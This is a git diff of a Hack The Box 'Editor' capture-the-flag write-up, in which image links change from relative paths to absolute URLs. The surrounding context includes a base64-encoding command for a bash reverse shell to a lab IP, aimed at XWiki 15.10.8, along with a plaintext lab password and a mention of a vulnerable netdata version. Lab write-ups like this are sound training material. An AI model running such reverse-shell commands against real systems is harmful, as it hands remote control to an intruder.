@@ -86,7 +86,7 @@ Access to http://editor.htb
 
 
 
-![editor_1](/dist/assets/editor/htb_editor_1.png)
+![editor_1](https://gianlucabassani.github.io/assets/editor/htb_editor_1.png)
 
 
 
@@ -94,7 +94,7 @@ Access to http://editor.htb
 
 
 
-![editor_2](/dist/assets/editor/htb_editor_2.png)
+![editor_2](https://gianlucabassani.github.io/assets/editor/htb_editor_2.png)
 
 
 
@@ -106,13 +106,13 @@ Access to: http://wiki.editor.htb
 
 
 
-![editor_3](/dist/assets/editor/htb_editor_3.png)
+![editor_3](https://gianlucabassani.github.io/assets/editor/htb_editor_3.png)
 
 - XWiki version 15.10.8 running on wiki subdomain.
 
 
 
-![editor_4](/dist/assets/editor/htb_editor_4.png)
+![editor_4](https://gianlucabassani.github.io/assets/editor/htb_editor_4.png)
 
 
 
@@ -143,7 +143,7 @@ echo -n 'bash -c '"'"'sh -i >& /dev/tcp/10.10.14.112/4444 0>&1'"'"'' | base64
 
 - Replace exploit_url with the new payload:
 
-![editor_5](/dist/assets/editor/htb_editor_5.png)
+![editor_5](https://gianlucabassani.github.io/assets/editor/htb_editor_5.png)
 
 
 
@@ -346,7 +346,7 @@ Pass: theEd1t0rTeam99
 
 Access netdata dashboard: http://127.0.0.1:19999
 
-![editor_6](/dist/assets/editor/htb_editor_6.png)
+![editor_6](https://gianlucabassani.github.io/assets/editor/htb_editor_6.png)
 
 - Warning indicates the version is outdated and vulnerable.
 
